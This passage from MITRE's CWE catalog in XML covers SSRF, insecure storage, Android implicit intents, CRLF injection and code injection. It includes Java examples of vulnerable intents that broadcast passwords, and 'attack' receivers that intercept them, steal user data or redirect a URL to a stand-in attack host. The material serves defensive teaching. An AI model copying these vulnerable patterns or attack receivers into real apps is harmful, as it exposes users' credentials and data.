               <Description>URL-downloading library automatically follows redirects to file:// and scp:// URLs</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0037</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="664"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-913"/>
            <Reference External_Reference_ID="REF-914"/>
            <Reference External_Reference_ID="REF-915"/>
            <Reference External_Reference_ID="REF-916"/>
            <Reference External_Reference_ID="REF-917"/>
            <Reference External_Reference_ID="REF-918"/>
            <Reference External_Reference_ID="REF-919"/>
            <Reference External_Reference_ID="REF-920"/>
         </References>
         <Notes>
            <Note Type="Relationship">CWE-918 (SSRF) and CWE-611 (XXE) are closely related, because they both involve web-related technologies and can launch outbound requests to unexpected destinations. However, XXE can be performed client-side, or in other contexts in which the software is not acting directly as a server, so the "Server" portion of the SSRF acronym does not necessarily apply.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-02-17</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated References, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="922" Name="Insecure Storage of Sensitive Information" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The product stores sensitive information without properly limiting read or write access by unauthorized actors.</Description>
         <Extended_Description>If read access is not properly restricted, then attackers can steal the sensitive information. If write access is not properly restricted, then attackers can modify and possibly delete the data, causing incorrect results and possibly a denial of service.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>System Configuration</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>Attackers can read sensitive information by accessing the unrestricted storage mechanism.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>Attackers can overwrite sensitive information by accessing the unrestricted storage mechanism.</Note>
            </Consequence>
         </Common_Consequences>
         <Notes>
            <Note Type="Relationship">There is an overlapping relationship between insecure storage of sensitive information (CWE-922) and missing encryption of sensitive information (CWE-311). Encryption is often used to prevent an attacker from reading the sensitive data. However, encryption does not prevent the attacker from erasing or overwriting the data. While data tampering would be visible upon inspection, the integrity and availability of the data is compromised prior to the audit.</Note>
            <Note Type="Maintenance">This is a high-level entry that includes children from various parts of the CWE research view (CWE-1000). Currently, most of the information is in these child entries. This entry will be made more comprehensive in later CWE versions.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Relationship_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Contribution Type="Feedback">
               <Contribution_Name>Mathias Millet</Contribution_Name>
               <Contribution_Organization>GitGuardian</Contribution_Organization>
               <Contribution_Date>2022-07-08</Contribution_Date>
               <Contribution_Comment>Suggested changes to Common Consequences and Relationship Notes.</Contribution_Comment>
            </Contribution>
         </Content_History>
      </Weakness>
      <Weakness ID="927" Name="Use of Implicit Intent for Sensitive Communication" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The Android application uses an implicit intent for transmitting sensitive data to other applications.</Description>
         <Extended_Description>
            <xhtml:p>Since an implicit intent does not specify a particular application to receive the data, any application can process the intent by using an Intent Filter for that intent. This can allow untrusted applications to obtain sensitive data. There are two variations on the standard broadcast intent, ordered and sticky.</xhtml:p>
            <xhtml:p>Ordered broadcast intents are delivered to a series of registered receivers in order of priority as declared by the Receivers. A malicious receiver can give itself a high priority and cause a denial of service by stopping the broadcast from propagating further down the chain. There is also the possibility of malicious data modification, as a receiver may also alter the data within the Intent before passing it on to the next receiver. The downstream components have no way of asserting that the data has not been altered earlier in the chain.</xhtml:p>
            <xhtml:p>Sticky broadcast intents remain accessible after the initial broadcast. An old sticky intent will be broadcast again to any new receivers that register for it in the future, greatly increasing the chances of information exposure over time. Also, sticky broadcasts cannot be protected by permissions that may apply to other kinds of intents.</xhtml:p>
            <xhtml:p>In addition, any broadcast intent may include a URI that references data that the receiving component does not normally have the privileges to access. The sender of the intent can include special privileges that grant the receiver read or write access to the specific URI included in the intent. A malicious receiver that intercepts this intent will also gain those privileges and be able to read or write the resource at the specified URI.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="285" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Other applications, possibly untrusted, can read the data that is offered through the Intent.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Varies by Context</Impact>
               <Note>The application may handle responses from untrusted applications on the device, which could cause it to perform unexpected or unauthorized actions.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If the application only requires communication with its own components, then the destination is always known, and an explicit intent could be used.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This application wants to create a user account in several trusted applications using one broadcast intent:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Intent intent = new Intent();<xhtml:br/>intent.setAction("com.example.CreateUser");<xhtml:br/>intent.putExtra("Username", uname_string);<xhtml:br/>intent.putExtra("Password", pw_string);<xhtml:br/>sendBroadcast(intent);</xhtml:div>
               </Example_Code>
               <Body_Text>This application assumes only the trusted applications will be listening for the action. A malicious application can register for this action and intercept the user's login information, as below:</Body_Text>
               <Example_Code Nature="Attack" Language="Java">
                  <xhtml:div>IntentFilter filter = new IntentFilter("com.example.CreateUser");<xhtml:br/>MyReceiver receiver = new MyReceiver();<xhtml:br/>registerReceiver(receiver, filter);</xhtml:div>
               </Example_Code>
               <Body_Text>When a broadcast contains sensitive information, create an allowlist of applications that can receive the action using the application's manifest file, or programmatically send the intent to each individual intended receiver.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This application interfaces with a web service that requires a separate user login. It creates a sticky intent, so that future trusted applications that also use the web service will know who the current user is:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Intent intent = new Intent();<xhtml:br/>intent.setAction("com.example.service.UserExists");<xhtml:br/>intent.putExtra("Username", uname_string);<xhtml:br/>sendStickyBroadcast(intent);</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Attack" Language="Java">
                  <xhtml:div>IntentFilter filter = new IntentFilter("com.example.service.UserExists");<xhtml:br/>MyReceiver receiver = new MyReceiver();<xhtml:br/>registerReceiver(receiver, filter);</xhtml:div>
               </Example_Code>
               <Body_Text>Sticky broadcasts can be read by any application at any time, and so should never contain sensitive information such as a username.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This application is sending an ordered broadcast, asking other applications to open a URL:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Intent intent = new Intent();<xhtml:br/>intent.setAction("com.example.OpenURL");<xhtml:br/>intent.putExtra("URL_TO_OPEN", url_string);<xhtml:br/>sendOrderedBroadcastAsUser(intent);</xhtml:div>
               </Example_Code>
               <Body_Text>Any application in the broadcast chain may alter the data within the intent. This malicious application is altering the URL to point to an attack site:</Body_Text>
               <Example_Code Nature="Attack" Language="Java">
                  <xhtml:div>public class CallReceiver extends BroadcastReceiver {<xhtml:div style="margin-left:1em;">@Override<xhtml:br/>public void onReceive(Context context, Intent intent) {<xhtml:div style="margin-left:1em;">String Url = intent.getStringExtra(Intent.URL_TO_OPEN);<xhtml:br/>attackURL = "www.example.com/attack?" + Url;<xhtml:br/>setResultData(attackURL);</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The final receiving application will then open the attack URL. Where possible, send intents to specific trusted applications instead of using a broadcast chain.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-108">
               <Intro_Text>This application sends a special intent with a flag that allows the receiving application to read a data file for backup purposes.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Intent intent = new Intent();<xhtml:br/>intent.setAction("com.example.BackupUserData");<xhtml:br/>intent.setData(file_uri);<xhtml:br/>intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION);<xhtml:br/>sendBroadcast(intent);</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Attack" Language="Java">
                  <xhtml:div>public class CallReceiver extends BroadcastReceiver {<xhtml:div style="margin-left:1em;">@Override<xhtml:br/>public void onReceive(Context context, Intent intent) {<xhtml:div style="margin-left:1em;">Uri userData = intent.getData();<xhtml:br/>stealUserData(userData);</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Any malicious application can register to receive this intent. Because of the FLAG_GRANT_READ_URI_PERMISSION included with the intent, the malicious receiver code can read the user's data.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <References>
            <Reference External_Reference_ID="REF-922" Section="3.2.1"/>
            <Reference External_Reference_ID="REF-923"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2013-07-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="93" Name="Improper Neutralization of CRLF Sequences ('CRLF Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product uses CRLF (carriage return line feeds) as a special element, e.g. to separate lines or records, but it does not neutralize or incorrectly neutralizes CRLF sequences from inputs.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="117" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Avoid using CRLF as a special sequence.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Appropriately filter or quote CRLF sequences in user-controlled input.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>If user input data that eventually makes it to a log message isn't checked for CRLF characters, it may be possible for an attacker to forge entries in a log file.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>logger.info("User's street address: " + request.getParameter("streetAddress"));</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-1771</Reference>
               <Description>CRLF injection enables spam proxy (add mail headers) using email address or name.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1771</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1783</Reference>
               <Description>CRLF injection in API function arguments modify headers for outgoing requests.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1783</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1513</Reference>
               <Description>Spoofed entries in web server log file via carriage returns</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1513</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4624</Reference>
               <Description>Chain: inject fake log entries with fake timestamps using CRLF injection</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4624</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1951</Reference>
               <Description>Chain: Application accepts CRLF in an object ID, allowing HTTP response splitting.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1951</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1687</Reference>
               <Description>Chain: HTTP response splitting via CRLF in parameter related to URL.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1687</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>CRLF Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Injection Flaws</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>24</Entry_ID>
               <Entry_Name>HTTP Request Splitting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="15"/>
            <Related_Attack_Pattern CAPEC_ID="81"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-928"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Research_Gaps</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">CRLF Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Sanitize CRLF Sequences (aka 'CRLF Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Failure to Sanitize CRLF Sequences ('CRLF Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="94" Name="Improper Control of Generation of Code ('Code Injection')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.</Description>
         <Extended_Description>
            <xhtml:p>When a product allows a user's input to contain code syntax, it might be possible for an attacker to craft the code in such a way that it will alter the intended control flow of the product. Such an alteration could lead to arbitrary code execution.</xhtml:p>
            <xhtml:p>Injection problems encompass a wide variety of issues -- all mitigated in very different ways. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="913" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Interpreted" Prevalence="Sometimes"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>In some cases, injectable code controls authentication; this may lead to a remote vulnerability.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Injected code can access resources that the attacker is directly prevented from accessing.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Code injection attacks can lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing. Additionally, code injection can often result in the execution of arbitrary code.</Note>
            </Consequence>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Often the actions performed by injected control code are unlogged.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Refactor your program so that you do not have to dynamically generate code.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which code can be executed by your product.</xhtml:p>
                  <xhtml:p>Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
